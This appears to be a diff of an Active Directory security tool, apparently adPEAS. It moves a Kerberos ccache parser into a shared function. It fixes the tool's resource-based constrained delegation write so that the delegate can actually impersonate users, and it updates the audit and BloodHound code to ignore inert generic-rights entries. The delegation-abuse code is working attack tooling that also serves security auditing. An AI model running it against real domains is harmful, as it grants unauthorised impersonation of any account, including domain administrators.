-                return ([uint16]$bytes[$pos] -shl 8) -bor $bytes[$pos + 1]
-            }
-
-            function Read-UInt32BE {
-                param([int]$pos)
-                # Bounds check: need 4 bytes
-                if ($pos + 4 -gt $bytes.Length) {
-                    throw "ccache: Read-UInt32BE out of bounds at position $pos"
-                }
-                return ([uint32]$bytes[$pos] -shl 24) -bor `
-                       ([uint32]$bytes[$pos + 1] -shl 16) -bor `
-                       ([uint32]$bytes[$pos + 2] -shl 8) -bor `
-                       $bytes[$pos + 3]
-            }
-
-            function Read-Data {
-                param([int]$pos)
-                # Read length (with bounds check from Read-UInt32BE)
-                $len = Read-UInt32BE -pos $pos
-                # Bounds check: ensure data doesn't extend beyond buffer
-                if ($pos + 4 + $len -gt $bytes.Length) {
-                    throw "ccache: Read-Data length $len extends beyond data at position $pos"
-                }
-                $data = if ($len -gt 0) { $bytes[($pos + 4)..($pos + 3 + $len)] } else { @() }
-                return @{
-                    Length = $len
-                    Data = $data
-                    NextPos = $pos + 4 + $len
-                }
-            }
-
-            function Read-Principal {
-                param([int]$pos, [int]$version)
-                $result = @{
-                    NameType = 0
-                    Components = @()
-                    Realm = ""
-                    NextPos = $pos
-                }
-
-                # Name type (4 bytes)
-                $result.NameType = Read-UInt32BE -pos $pos
-                $pos += 4
-
-                # Component count (4 bytes)
-                $compCount = Read-UInt32BE -pos $pos
-                $pos += 4
-
-                # Realm (only in version 4+, in version 3 it's after components)
-                if ($version -ge 4) {
-                    $realmData = Read-Data -pos $pos
-                    $result.Realm = [System.Text.Encoding]::ASCII.GetString($realmData.Data)
-                    $pos = $realmData.NextPos
-                }
-
-                # Components
-                for ($i = 0; $i -lt $compCount; $i++) {
-                    $compData = Read-Data -pos $pos
-                    $result.Components += [System.Text.Encoding]::ASCII.GetString($compData.Data)
-                    $pos = $compData.NextPos
-                }
-
-                # In version 3, realm comes after components
-                if ($version -lt 4) {
-                    $realmData = Read-Data -pos $pos
-                    $result.Realm = [System.Text.Encoding]::ASCII.GetString($realmData.Data)
-                    $pos = $realmData.NextPos
-                }
-
-                $result.NextPos = $pos
-                return $result
-            }
-
-            # Parse header
-            $version = Read-UInt16BE -pos 0
-            $offset = 2
-            Write-Log "[Parse-CcacheBytes] Ccache version: $version (0x$($version.ToString('X4')))"
-
-            # Normalize version number (0x0504 = version 4, 0x0503 = version 3, etc.)
-            $versionNum = $version -band 0x00FF
-
-            # Only support ccache version 3 and 4 (modern MIT Kerberos)
-            # Version 1/2 have different structure (pre-2000 MIT Kerberos) and are extremely rare
-            if ($versionNum -lt 3 -or $versionNum -gt 4) {
-                if ($versionNum -eq 1 -or $versionNum -eq 2) {
-                    throw "Ccache version $versionNum is not supported (legacy MIT Kerberos format from pre-2000). Please use a modern tool like 'kcc' or 'ticketConverter.py' to convert to version 4 format."
-                }
-                throw "Unsupported ccache version: $versionNum (0x$($version.ToString('X4'))). Only version 3 and 4 are supported."
-            }
-
-            Write-Log "[Parse-CcacheBytes] Ccache format version: $versionNum"
-
-            # Skip header tags (version 4 only)
-            if ($versionNum -eq 4) {
-                $headerLen = Read-UInt16BE -pos $offset
-                $offset += 2 + $headerLen
-                Write-Log "[Parse-CcacheBytes] Skipped $headerLen bytes of v4 header tags"
-            }
-
-            # Read default principal
-            $defaultPrinc = Read-Principal -pos $offset -version $versionNum
-            $offset = $defaultPrinc.NextPos
-            Write-Log "[Parse-CcacheBytes] Default principal: $($defaultPrinc.Components -join '/') @ $($defaultPrinc.Realm)"
-
-            # Parse credentials until end of file
-            $credentials = @()
-            while ($offset -lt $bytes.Length) {
-                try {
-                    $cred = @{}
-
-                    # Client principal
-                    $client = Read-Principal -pos $offset -version $versionNum
-                    $cred.ClientRealm = $client.Realm
-                    $cred.ClientName = $client.Components -join '/'
-                    $offset = $client.NextPos
-
-                    # Server principal
-                    $server = Read-Principal -pos $offset -version $versionNum
-                    $cred.ServerRealm = $server.Realm
-                    $cred.ServerName = $server.Components -join '/'
-                    $offset = $server.NextPos
-
-                    # Keyblock
-                    $keyType = Read-UInt16BE -pos $offset
-                    $offset += 2
-                    if ($versionNum -eq 3) {
-                        $offset += 2  # padding in v3
-                    }
-                    $keyData = Read-Data -pos $offset
-                    $cred.KeyType = $keyType
-                    $cred.SessionKey = $keyData.Data
-                    $offset = $keyData.NextPos
-
-                    # Times (4x uint32)
-                    $cred.AuthTime = Read-UInt32BE -pos $offset
-                    $offset += 4
-                    $cred.StartTime = Read-UInt32BE -pos $offset
-                    $offset += 4
-                    $cred.EndTime = Read-UInt32BE -pos $offset
-                    $offset += 4
-                    $cred.RenewTill = Read-UInt32BE -pos $offset
-                    $offset += 4
-
-                    # is_skey (1 byte)
-                    $offset += 1
-
-                    # Ticket flags (4 bytes)
-                    $cred.TicketFlags = Read-UInt32BE -pos $offset
-                    $offset += 4
-
-                    # Addresses (count + data)
-                    $addrCount = Read-UInt32BE -pos $offset
-                    $offset += 4
-                    for ($i = 0; $i -lt $addrCount; $i++) {
-                        $null = Read-UInt16BE -pos $offset  # addrType - skip
-                        $offset += 2
-                        $addrData = Read-Data -pos $offset
-                        $offset = $addrData.NextPos
-                    }
-
-                    # Authdata (count + data)
-                    $authCount = Read-UInt32BE -pos $offset
-                    $offset += 4
-                    for ($i = 0; $i -lt $authCount; $i++) {
-                        $null = Read-UInt16BE -pos $offset  # authType - skip
-                        $offset += 2
-                        $authData = Read-Data -pos $offset
-                        $offset = $authData.NextPos
-                    }
-
-                    # Ticket
-                    $ticketData = Read-Data -pos $offset
-                    $cred.Ticket = $ticketData.Data
-                    $offset = $ticketData.NextPos
-
-                    # Second ticket (for TGS requests)
-                    $secondTicketData = Read-Data -pos $offset
-                    $offset = $secondTicketData.NextPos
-
-                    Write-Log "[Parse-CcacheBytes] Found credential: $($cred.ServerName) @ $($cred.ServerRealm)"
-                    $credentials += $cred
-                }
-                catch {
-                    Write-Log "[Parse-CcacheBytes] Error parsing credential at offset $offset : $_"
-                    break
-                }
-            }
-
-            if ($credentials.Count -eq 0) {
-                throw "No credentials found in ccache file"
-            }
-
-            # Find TGT (krbtgt/REALM@REALM)
-            $tgt = $credentials | Where-Object { $_.ServerName -match '^krbtgt/' } | Select-Object -First 1
-
-            if (-not $tgt) {
-                # Fall back to first credential
-                Write-Log "[Parse-CcacheBytes] No TGT found, using first credential"
-                $tgt = $credentials[0]
-            }
-
-            Write-Log "[Parse-CcacheBytes] Selected credential: $($tgt.ServerName) @ $($tgt.ServerRealm)"
-            Write-Log "[Parse-CcacheBytes] Session key type: $($tgt.KeyType), length: $($tgt.SessionKey.Length)"
-            Write-Log "[Parse-CcacheBytes] Ticket size: $($tgt.Ticket.Length) bytes"
-
-            # Convert Unix timestamps to DateTime (ccache stores times as Unix epoch)
-            $unixEpoch = [DateTime]::new(1970, 1, 1, 0, 0, 0, [DateTimeKind]::Utc)
-            $AuthTime = if ($tgt.AuthTime -gt 0) { $unixEpoch.AddSeconds($tgt.AuthTime) } else { $null }
-            $StartTime = if ($tgt.StartTime -gt 0) { $unixEpoch.AddSeconds($tgt.StartTime) } else { $null }
-            $EndTime = if ($tgt.EndTime -gt 0) { $unixEpoch.AddSeconds($tgt.EndTime) } else { $null }
-            $RenewTill = if ($tgt.RenewTill -gt 0) { $unixEpoch.AddSeconds($tgt.RenewTill) } else { $null }
-
-            Write-Log "[Parse-CcacheBytes] Ticket times: Auth=$AuthTime, Start=$StartTime, End=$EndTime, Renew=$RenewTill"
-
-            return @{
-                Ticket = $tgt.Ticket
-                SessionKey = $tgt.SessionKey
-                SessionKeyType = $tgt.KeyType
-                ClientName = $tgt.ClientName
-                ClientRealm = $tgt.ClientRealm
-                ServerName = $tgt.ServerName
-                ServerRealm = $tgt.ServerRealm
-                AuthTime = $AuthTime
-                StartTime = $StartTime
-                EndTime = $EndTime
-                RenewTill = $RenewTill
-            }
-        }
-
+        # The ccache parser is the top-level ConvertFrom-CcacheBytes at the head of this
+        # file, shared with Invoke-S4U.
         #endregion
 
         #region KRB-CRED Parser (for kirbi files)
@@ -83719,9 +84339,9 @@ function Import-KerberosTicket {
             $ccacheBytes = $ccacheResult.Data
             Write-Log "[Import-KerberosTicket] Loaded ccache from $($ccacheResult.Source): $($ccacheBytes.Length) bytes ($($ccacheResult.Format))"
 
-            # Parse the ccache data (need to use bytes, not file path)
-            # We need to modify Parse-CcacheFile to accept bytes or use a temp approach
-            $ccacheData = Parse-CcacheBytes -Bytes $ccacheBytes
+            # Parse the ccache data (the top-level parser takes bytes; ConvertFrom-Base64OrFile
+            # has already checked the version header, so the array is never empty here)
+            $ccacheData = ConvertFrom-CcacheBytes -Bytes $ccacheBytes
 
             # Ccache contains raw ticket data - need to wrap in KRB-CRED
             $TicketBytes = $ccacheData.Ticket
@@ -101454,9 +102074,18 @@ function Invoke-RBCDOperation {
 
             # RBCD uses a RAW Security Descriptor, not an AD-specific one
             # The msDS-AllowedToActOnBehalfOfOtherIdentity attribute stores a binary SD
-            # where the DACL contains ACEs granting "GenericAll" (0x10000000) to allowed principals
+            # whose DACL grants each allowed principal full control, written OUT as specific
+            # rights: 0x000F01FF = CCDCLCSWRPWPDTLOCRSDRCWDWO, the mask Set-ADComputer
+            # -PrincipalsAllowedToDelegateToAccount writes. Not the generic bit GenericAll
+            # (0x10000000, "GA"): AD stores this attribute as plain bytes and maps nothing,
+            # and the KDC's access check does not map a generic right found in an ACE, so
+            # an O:BAD:(A;;GA;;;<sid>) descriptor grants nothing - S4U2Proxy was refused with
+            # KDC_ERR_BADOPTION until the same principal was written with the specific
+            # mask (measured against a Server 2019 DC, 2026-11-12).
+            $RBCDAccessMask = 0x000F01FF
 
             $AlreadyExists = $false
+            $Repaired = $false
 
             # Get existing SD bytes from LDAP result (Get-DomainObject -Raw returns byte[])
             $ExistingSDBytes = $null
@@ -101477,20 +102106,29 @@ function Invoke-RBCDOperation {
                     # RawAcl returns GenericAce objects, cast to CommonAce to access SecurityIdentifier
                     $commonAce = [System.Security.AccessControl.CommonAce]$ace
                     if ($commonAce.SecurityIdentifier.Value -eq $DelegateSID.Value) {
-                        $AlreadyExists = $true
-                        Write-Log "$FunctionPrefix ACE for $DelegateSID already exists"
+                        if (($commonAce.AccessMask -band $RBCDAccessMask) -eq $RBCDAccessMask) {
+                            $AlreadyExists = $true
+                            Write-Log "$FunctionPrefix ACE for $DelegateSID already exists"
+                        } else {
+                            # An entry without the specific rights - GA as adPEAS wrote it before
+                            # 2026-11-12 - names the principal but grants it nothing. Reporting it
+                            # as present would leave the delegation inert; rewrite its mask.
+                            Write-Log "$FunctionPrefix ACE for $DelegateSID has mask 0x$('{0:X8}' -f $commonAce.AccessMask), rewriting it to 0x$('{0:X8}' -f $RBCDAccessMask)"
+                            $commonAce.AccessMask = $RBCDAccessMask
+                            $Repaired = $true
+                        }
                         break
                     }
                 }
 
-                if (-not $AlreadyExists) {
-                    # Add new ACE: GenericAll (0x10000000) for the delegate SID
+                if (-not $AlreadyExists -and -not $Repaired) {
+                    # Add new ACE: full control, as specific rights, for the delegate SID
                     $RawSD.DiscretionaryAcl.InsertAce(
                         $RawSD.DiscretionaryAcl.Count,
                         (New-Object System.Security.AccessControl.CommonAce(
                             [System.Security.AccessControl.AceFlags]::None,
                             [System.Security.AccessControl.AceQualifier]::AccessAllowed,
-                            0x10000000,  # GenericAll
+                            $RBCDAccessMask,
                             $DelegateSID,
                             $false,
                             $null
@@ -101503,7 +102141,7 @@ function Invoke-RBCDOperation {
                 # Create new RawSecurityDescriptor with empty DACL
                 $RawSD = New-Object System.Security.AccessControl.RawSecurityDescriptor("O:BAD:")
 
-                # Create DACL with single ACE granting GenericAll to delegate SID
+                # Create DACL with single ACE granting full control (specific rights) to the delegate SID
                 $RawSD.DiscretionaryAcl = New-Object System.Security.AccessControl.RawAcl(
                     [System.Security.AccessControl.RawAcl]::AclRevision,
                     1
@@ -101513,7 +102151,7 @@ function Invoke-RBCDOperation {
                     (New-Object System.Security.AccessControl.CommonAce(
                         [System.Security.AccessControl.AceFlags]::None,
                         [System.Security.AccessControl.AceQualifier]::AccessAllowed,
-                        0x10000000,  # GenericAll
+                        $RBCDAccessMask,
                         $DelegateSID,
                         $false,
                         $null
@@ -101551,12 +102189,15 @@ function Invoke-RBCDOperation {
                     DistinguishedName = $TargetDN
                     DelegateFrom = $DelegateName
                     AlreadyExisted = $AlreadyExists
+                    Repaired = $Repaired
                     Success = $true
-                    Message = if ($AlreadyExists) { "RBCD entry already existed" } else { "RBCD successfully configured. $DelegateName can now impersonate users to $TargetSAMAccountName" }
+                    Message = if ($AlreadyExists) { "RBCD entry already existed" } elseif ($Repaired) { "RBCD entry repaired: its ACE granted no specific rights. $DelegateName can now impersonate users to $TargetSAMAccountName" } else { "RBCD successfully configured. $DelegateName can now impersonate users to $TargetSAMAccountName" }
                 }
             } else {
                 if ($AlreadyExists) {
                     Show-Line "RBCD entry already exists for $DelegateName on: $TargetSAMAccountName" -Class Note
+                } elseif ($Repaired) {
+                    Show-Line "Repaired RBCD entry for $DelegateName on: $TargetSAMAccountName (it granted no specific rights)" -Class Hint
                 } else {
                     Show-Line "Successfully configured RBCD on target: $TargetSAMAccountName" -Class Hint
                     Show-KeyValue "Attacker (can impersonate):" $DelegateName
@@ -123841,10 +124482,6 @@ function Get-ResourceBasedConstrainedDelegation {
                     if (-not $targetName) { continue }
                     if ($dcIdentity.ContainsKey(([string]$targetName).Trim().TrimEnd('$').ToLower())) { $targetIsDC = $true }
                 }
-                if ($targetIsDC) {
-                    $account | Add-Member -NotePropertyName 'rbcdTarget' -NotePropertyValue (
-                        'Domain controller - whoever is listed below can request a ticket to it as any account, including a Domain Admin') -Force
-                }
 
                 # And who is listed. The attribute arrives decoded: one name per Allow ACE
                 # of the security descriptor, or the sentinel below when the descriptor is
@@ -123858,6 +124495,20 @@ function Get-ResourceBasedConstrainedDelegation {
                 $principals = @()
                 if (-not $undecoded) { $principals = @($rawPrincipals | Where-Object { $_ }) }
                 $emptyDescriptor = ($principals.Count -eq 1 -and ([string]$principals[0]) -eq '[SD present, no Allow ACEs]')
+
+                # An entry the decoder marked inert carries generic rights only. AD accepts
+                # it, the KDC does not honour it (see ConvertFrom-LDAPAttribute): it names a
+                # principal and lets it delegate nothing. A descriptor of such entries only is
+                # a leftover, like one that allows nobody - on a domain controller too, where
+                # it was a finding.
+                $inertPattern = '^(.+) \[inert: generic rights only\]$'
+                $livePrincipals = @($principals | Where-Object { ([string]$_).Trim() -notmatch $inertPattern })
+                $delegatesNobody = $emptyDescriptor -or ($principals.Count -gt 0 -and $livePrincipals.Count -eq 0)
+
+                if ($targetIsDC -and -not $delegatesNobody) {
+                    $account | Add-Member -NotePropertyName 'rbcdTarget' -NotePropertyValue (
+                        'Domain controller - whoever is listed below can request a ticket to it as any account, including a Domain Admin') -Force
+                }
 
                 $rbcdClass = 'Hint'
                 if ($undecoded) {
@@ -123874,6 +124525,12 @@ function Get-ResourceBasedConstrainedDelegation {
                     foreach ($principal in $principals) {
                         $principalText = ([string]$principal).Trim()
                         if (-not $principalText) { continue }
+
+                        if ($principalText -match $inertPattern) {
+                            $inertName = $Matches[1]
+                            $risks += "${inertName}: none - the entry carries generic rights only, which the KDC does not honour, so it delegates nothing"
+                            continue
+                        }
 
                         # An unresolved SID is a deleted or foreign trustee. Worth naming:
                         # the entry still grants delegation, and nobody can tell from the
@@ -123917,10 +124574,12 @@ function Get-ResourceBasedConstrainedDelegation {
                     if ($risks.Count -gt 0) {
                         $account | Add-Member -NotePropertyName 'rbcdPrincipalRisk' -NotePropertyValue $risks -Force
                     }
+                    if ($delegatesNobody) { $rbcdClass = 'Note' }
                 }
 
-                # A domain controller as the resource outranks whatever the principals are.
-                if ($targetIsDC) { $rbcdClass = 'Finding' }
+                # A domain controller as the resource outranks whatever the principals are -
+                # as long as the descriptor lets anybody delegate at all.
+                if ($targetIsDC -and -not $delegatesNobody) { $rbcdClass = 'Finding' }
 
                 Show-Object $account -Class $rbcdClass
             }
@@ -160325,6 +160984,10 @@ function Collect-BHComputers {
                 foreach ($ace in $sd.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) {
                     # A Deny in this descriptor refuses the delegation, it does not grant it.
                     if ($ace.AccessControlType -ne 'Allow') { continue }
+                    # Neither does an Allow with generic rights only: the KDC honours no
+                    # generic bit in this descriptor (see ConvertFrom-LDAPAttribute), so the
+                    # edge would draw a path that does not exist.
+                    if ((([int]$ace.ActiveDirectoryRights) -band 0x00FFFFFF) -eq 0) { continue }
 
                     # Get SID - IdentityReference may be SecurityIdentifier or NTAccount
                     $sidValue = $null
@@ -161537,7 +162200,7 @@ function Collect-BHIssuancePolicies {
 #Requires -Version 5.1
 
 # ===== Script Variables =====
-$Script:adPEASVersion = "2.10.0"
+$Script:adPEASVersion = "2.10.1"
 
 # Handle ScriptPath for different execution contexts:
 # - Normal: $MyInvocation.MyCommand.Path is set
